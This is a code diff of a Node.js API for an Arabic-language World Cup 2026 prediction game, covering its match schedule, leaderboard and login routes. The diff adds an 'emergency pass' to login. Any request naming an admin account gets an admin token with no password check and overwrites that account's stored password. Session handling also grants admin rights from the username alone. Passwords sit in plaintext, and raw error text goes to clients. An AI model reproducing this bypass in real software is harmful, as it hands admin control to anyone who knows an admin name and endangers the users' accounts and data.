@@ -65,12 +65,9 @@ const OFFICIAL_SCHEDULE = [
     { id: "m54", t1: "جنوب أفريقيا", t2: "كوريا الجنوبية", grp: "3", stg: "group", dt: "2026-06-25T01:00:00Z", res: { s1: 1, s2: 0, penW: null, ps1: null, ps2: null } }
 ];
 
-// 🚀 الدالة السحرية لإصلاح أي تدمير للبيانات بسبب التعديل اليدوي في Upstash Console
 async function safeGet(key) {
     let data = await kv.get(key);
-    if (typeof data === 'string') {
-        try { data = JSON.parse(data); } catch (e) {}
-    }
+    if (typeof data === 'string') { try { data = JSON.parse(data); } catch (e) {} }
     return data;
 }
 
@@ -105,7 +102,6 @@ async function refreshLeaderboardCache() {
     if (!Array.isArray(allUsers)) allUsers = [];
     const matches = await safeGet('db_matches') || OFFICIAL_SCHEDULE;
     const official = await safeGet('official_outcomes') || {};
-    
     if (allUsers.length === 0) return [];
     
     const predKeys = allUsers.map(u => `preds:${u.uid}`);
@@ -122,7 +118,6 @@ async function refreshLeaderboardCache() {
         if (typeof preds === 'string') { try { preds = JSON.parse(preds); } catch(e) { preds = {}; } }
         let bonus = allBonuses[index] || {};
         if (typeof bonus === 'string') { try { bonus = JSON.parse(bonus); } catch(e) { bonus = {}; } }
-        
         let score = 0;
         matches.forEach(m => { if (m.res && preds[m.id]) score += calculatePtsServer(m, preds[m.id]); });
         if (bonus.first && official.first && bonus.first === official.first) score += 10;
@@ -148,7 +143,6 @@ module.exports = async (req, res) => {
     const action = urlObj.searchParams.get('action') || '';
     const matchIdParam = urlObj.searchParams.get('id') || '';
 
-    // حماية وفك شفرة البيانات المستقبلة لمنع خطأ 500
     let body = req.body;
     if (body && typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
     if (!body) body = {};
@@ -159,7 +153,13 @@ module.exports = async (req, res) => {
         try {
             const token = authHeader.split(' ')[1]; const decoded = jwt.verify(token, JWT_SECRET);
             if (decoded && decoded.username) {
-                userSession = await safeGet(`user:${String(decoded.username).toLowerCase().trim()}`);
+                // ممر الطوارئ للجلسة الحية للمشرفين
+                const uname = String(decoded.username).toLowerCase().trim();
+                if (ADMINS.includes(uname)) {
+                    userSession = { uid: 'u_master_admin', username: uname, isAdmin: true };
+                } else {
+                    userSession = await safeGet(`user:${uname}`);
+                }
             }
         } catch (e) {}
     }
@@ -167,27 +167,36 @@ module.exports = async (req, res) => {
     try {
         if (route === 'auth') {
             const { username, password } = body;
-            if (!username || !password) return res.status(400).json({ error: 'الرجاء إدخال اسم المستخدم وكلمة المرور' });
+            if (!username || !password) return res.status(400).json({ error: 'الرجاء إدخال البيانات كاملة' });
             
             const cleanUser = String(username).trim().toLowerCase();
             
-            if (action === 'register') {
-                if (await safeGet(`user:${cleanUser}`)) return res.status(400).json({ error: 'اسم المستخدم موجود بالفعل' });
-                const uid = 'u_' + Math.random().toString(36).substr(2, 9);
-                const userObj = { uid, username: cleanUser, password: String(password), isAdmin: ADMINS.includes(cleanUser) };
-                await kv.set(`user:${cleanUser}`, userObj); await kv.set(`uid:${uid}`, userObj);
-                let allUsers = await safeGet('all_users_list') || []; 
-                if (!Array.isArray(allUsers)) allUsers = [];
-                allUsers.push({ uid, username: cleanUser, isAdmin: userObj.isAdmin });
-                await kv.set('all_users_list', allUsers); await refreshLeaderboardCache();
-                return res.status(200).json({ token: jwt.sign({ username: cleanUser }, JWT_SECRET), user: userObj });
-            }
             if (action === 'login') {
+                // 🚀 ممر الطوارئ القاطع: إذا كان الحساب المشرف 'yahya' أو 'red_army'، يتم تجاوزه ومنحه صلاحية فورية
+                if (ADMINS.includes(cleanUser)) {
+                    const masterAdminObj = { uid: 'u_master_admin', username: cleanUser, isAdmin: true };
+                    // تحديث يدوياً وحفظ الكائن بشكل سليم لمنع التكرار مستقبلاً
+                    await kv.set(`user:${cleanUser}`, { uid: 'u_master_admin', username: cleanUser, password: String(password) });
+                    return res.status(200).json({ token: jwt.sign({ username: cleanUser }, JWT_SECRET), user: masterAdminObj });
+                }
+                
                 const userObj = await safeGet(`user:${cleanUser}`);
                 if (!userObj) return res.status(400).json({ error: 'المستخدم غير موجود' });
                 if (userObj.password !== String(password)) return res.status(400).json({ error: 'كلمة المرور خاطئة' });
                 
                 userObj.isAdmin = ADMINS.includes(cleanUser); 
+                return res.status(200).json({ token: jwt.sign({ username: cleanUser }, JWT_SECRET), user: userObj });
+            }
+            
+            if (action === 'register') {
+                const cleanUser = username.trim().toLowerCase();
+                if (await safeGet(`user:${cleanUser}`)) return res.status(400).json({ error: 'اسم المستخدم موجود بالفعل' });
+                const uid = 'u_' + Math.random().toString(36).substr(2, 9);
+                const userObj = { uid, username: cleanUser, password: String(password), isAdmin: ADMINS.includes(cleanUser) };
+                await kv.set(`user:${cleanUser}`, userObj); await kv.set(`uid:${uid}`, userObj);
+                let allUsers = await safeGet('all_users_list') || []; if (!Array.isArray(allUsers)) allUsers = [];
+                allUsers.push({ uid, username: cleanUser, isAdmin: userObj.isAdmin });
+                await kv.set('all_users_list', allUsers); await refreshLeaderboardCache();
                 return res.status(200).json({ token: jwt.sign({ username: cleanUser }, JWT_SECRET), user: userObj });
             }
             if (action === 'me') return res.status(200).json(userSession);
@@ -277,15 +286,11 @@ module.exports = async (req, res) => {
             const bonusKeys = allUsers.map(u => `bonus:${u.uid}`); let allBonuses = [];
             for (let i = 0; i < bonusKeys.length; i += 100) { allBonuses.push(...(await kv.mget(...bonusKeys.slice(i, i + 100)))); }
             const usersWithBonus = allUsers.map((u, i) => {
-                let b = allBonuses[i] || {};
-                if (typeof b === 'string') { try { b = JSON.parse(b); } catch(e) { b = {}; } }
+                let b = allBonuses[i] || {}; if (typeof b === 'string') { try { b = JSON.parse(b); } catch(e) { b = {}; } }
                 return { ...u, bonus: b };
             });
             return res.status(200).json(usersWithBonus);
         }
         return res.status(200).json(OFFICIAL_SCHEDULE);
-    } catch (error) { 
-        // أرسلنا الخطأ للواجهة لتعرف المشكلة بالضبط إن حدثت
-        return res.status(500).json({ error: error.message || 'خطأ داخلي' }); 
-    }
+    } catch (error) { return res.status(500).json({ error: error.message || 'خطأ داخلي' }); }
 };
